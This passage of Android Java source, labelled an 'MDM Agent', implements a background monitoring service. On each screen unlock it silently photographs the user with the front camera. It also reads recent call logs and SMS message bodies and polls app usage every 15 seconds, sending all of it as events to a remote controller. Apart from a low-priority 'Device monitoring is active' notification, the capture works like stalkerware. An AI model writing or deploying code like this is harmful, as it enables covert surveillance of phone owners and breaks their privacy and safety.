                long now = System.currentTimeMillis();
                long prevDuration = now - screenStateChangedAt;
                screenStateChangedAt = now;
                if (Intent.ACTION_SCREEN_ON.equals(action)) {
                    isScreenOn = true;
                    sendScreenStatus("on", prevDuration);
                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                    isScreenOn = false;
                    sendScreenStatus("off", prevDuration);
                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                    // Screen unlocked — grab front camera photo
                    sendScreenStatus("unlocked", prevDuration);
                    takeUnlockPhoto();
                }
            }
        };
        IntentFilter f = new IntentFilter();
        f.addAction(Intent.ACTION_SCREEN_ON);
        f.addAction(Intent.ACTION_SCREEN_OFF);
        f.addAction(Intent.ACTION_USER_PRESENT);
        registerReceiver(screenReceiver, f);
        // Send initial status immediately
        sendScreenStatus(isScreenOn ? "on" : "off", 0);
    }

    private void sendScreenStatus(String status, long prevDurationMs) {
        try {
            JSONObject d = new JSONObject();
            d.put("status", status);
            d.put("timestamp", System.currentTimeMillis());
            d.put("prevDurationMs", prevDurationMs);
            sendEvent("screen:status", d);
        } catch (Exception ignored) {}
    }

    private void takeUnlockPhoto() {
        if (cameraActive) {
            pendingUnlockPhoto = true; // front camera streaming — grab next frame
            return;
        }
        HandlerThread t = new HandlerThread("MdmUnlock"); t.start();
        Handler h = new Handler(t.getLooper());
        try {
            CameraManager mgr = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : mgr.getCameraIdList()) {
                CameraCharacteristics ch = mgr.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) { camId = id; break; }
            }
            if (camId == null) { t.quitSafely(); return; }
            final ImageReader ir = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            mgr.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    try {
                        cam.createCaptureSession(Arrays.asList(ir.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        CaptureRequest.Builder req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        req.addTarget(ir.getSurface());
                                        session.capture(req.build(), new CameraCaptureSession.CaptureCallback() {
                                            @Override public void onCaptureCompleted(CameraCaptureSession s,
                                                    CaptureRequest r, android.hardware.camera2.TotalCaptureResult result) {
                                                // Read image after capture completes
                                                Image img = ir.acquireLatestImage();
                                                if (img != null) {
                                                    try {
                                                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                                        byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                                                        JSONObject ud = new JSONObject();
                                                        ud.put("frame", Base64.encodeToString(bytes, Base64.NO_WRAP));
                                                        ud.put("timestamp", System.currentTimeMillis());
                                                        sendEvent("unlock:photo", ud);
                                                    } catch (Exception ignored) {
                                                    } finally { img.close(); }
                                                }
                                                try { session.close(); } catch (Exception ignored) {}
                                                try { cam.close(); }     catch (Exception ignored) {}
                                                try { ir.close(); }      catch (Exception ignored) {}
                                                t.quitSafely();
                                            }
                                        }, h);
                                    } catch (Exception e) {
                                        try { cam.close(); } catch (Exception ignored) {}
                                        try { ir.close(); } catch (Exception ignored) {}
                                        t.quitSafely();
                                    }
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) {
                                    try { cam.close(); } catch (Exception ignored) {}
                                    try { ir.close(); } catch (Exception ignored) {}
                                    t.quitSafely();
                                }
                            }, h);
                    } catch (Exception e) {
                        try { cam.close(); } catch (Exception ignored) {}
                        try { ir.close(); } catch (Exception ignored) {}
                        t.quitSafely();
                    }
                }
                @Override public void onDisconnected(CameraDevice c) {
                    try { c.close(); } catch (Exception ignored) {}
                    try { ir.close(); } catch (Exception ignored) {}
                    t.quitSafely();
                }
                @Override public void onError(CameraDevice c, int e) {
                    try { c.close(); } catch (Exception ignored) {}
                    try { ir.close(); } catch (Exception ignored) {}
                    t.quitSafely();
                }
            }, h);
        } catch (Exception e) { t.quitSafely(); }
    }

    // ── Call Logs (ContentResolver, no WebView needed) ────────────────
    private void readCallLogs() {
        try {
            JSONArray logs = new JSONArray();
            String[] proj = { CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                              CallLog.Calls.DURATION, CallLog.Calls.DATE, CallLog.Calls.TYPE };
            try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, proj, null, null, CallLog.Calls.DATE + " DESC")) {
                int count = 0;
                while (c != null && c.moveToNext() && count++ < 50) {
                    JSONObject e = new JSONObject();
                    e.put("number",   c.getString(0));
                    e.put("name",     c.isNull(1) ? "" : c.getString(1));
                    e.put("duration", c.getLong(2));
                    e.put("date",     c.getLong(3));
                    int t = c.getInt(4);
                    e.put("type", t == CallLog.Calls.INCOMING_TYPE ? "incoming" :
                                  t == CallLog.Calls.OUTGOING_TYPE ? "outgoing" : "missed");
                    logs.put(e);
                }
            }
            JSONObject d = new JSONObject(); d.put("logs", logs);
            sendEvent("call:logs", d);
        } catch (Exception ignored) {}
    }

    // ── SMS (ContentResolver, no WebView needed) ──────────────────────
    private void readSMS() {
        try {
            JSONArray messages = new JSONArray();
            String[] proj = { "address", "body", "date", "type" };
            try (Cursor c = getContentResolver().query(Uri.parse("content://sms/"), proj, null, null, "date DESC")) {
                int count = 0;
                while (c != null && c.moveToNext() && count++ < 50) {
                    JSONObject m = new JSONObject();
                    m.put("address", c.getString(0));
                    m.put("body",    c.getString(1));
                    m.put("date",    c.getLong(2));
                    m.put("type",    c.getInt(3) == 1 ? "inbox" : "sent");
                    messages.put(m);
                }
            }
            JSONObject d = new JSONObject(); d.put("messages", messages);
            sendEvent("sms:messages", d);
        } catch (Exception ignored) {}
    }

    // ── Recent apps (UsageStats) ──────────────────────────────────────
    private void readRecentApps() {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            long now = System.currentTimeMillis();
            List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, now - 24L * 60 * 60 * 1000, now);
            // Reliable permission check: if list is null or empty, permission not granted
            if (stats == null || stats.isEmpty()) {
                JSONObject err = new JSONObject(); err.put("error", "usage_access_not_granted");
                sendEvent("recent:apps", err); return;
            }
            JSONArray apps = new JSONArray();
            stats.sort((a, b) -> Long.compare(b.getLastTimeUsed(), a.getLastTimeUsed()));
            int count = 0;
            for (UsageStats s : stats) {
                if (s.getTotalTimeInForeground() == 0) continue;
                if (count++ >= 30) break;
                JSONObject a = new JSONObject();
                a.put("package",  s.getPackageName());
                a.put("lastUsed", s.getLastTimeUsed());
                a.put("totalMs",  s.getTotalTimeInForeground());
                apps.put(a);
            }
            JSONObject d = new JSONObject(); d.put("apps", apps);
            sendEvent("recent:apps", d);
        } catch (Exception ignored) {}
    }

    // ── Recent apps auto-poll ─────────────────────────────────────────
    private void startRecentAppsPolling() {
        if (recentAppsPollingActive) return;
        recentAppsPollingActive = true;
        scheduleRecentAppsPoll();
    }

    private void stopRecentAppsPolling() { recentAppsPollingActive = false; }

    private void scheduleRecentAppsPoll() {
        mainHandler.postDelayed(() -> {
            if (!recentAppsPollingActive) return;
            autoCheckRecentApps();
            scheduleRecentAppsPoll();
        }, 15_000);
    }

    private void autoCheckRecentApps() {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            long now = System.currentTimeMillis();
            List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, now - 24L * 60 * 60 * 1000, now);
            if (stats == null || stats.isEmpty()) return; // permission not granted, skip silently
            String topPkg = null; long topTime = 0;
            for (UsageStats s : stats) {
                if (s.getTotalTimeInForeground() > 0 && s.getLastTimeUsed() > topTime) {
                    topTime = s.getLastTimeUsed();
                    topPkg  = s.getPackageName();
                }
            }
            if (topPkg != null && !topPkg.equals(lastUsedAppPkg)) {
                lastUsedAppPkg = topPkg;
                readRecentApps();
            }
        } catch (Exception ignored) {}
    }

    private Notification buildNotification() {
        Intent openApp = new Intent(this, MainActivity.class);
        openApp.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        PendingIntent pi = PendingIntent.getActivity(this, 0, openApp, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("MDM Agent")
            .setContentText("Device monitoring is active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }
}
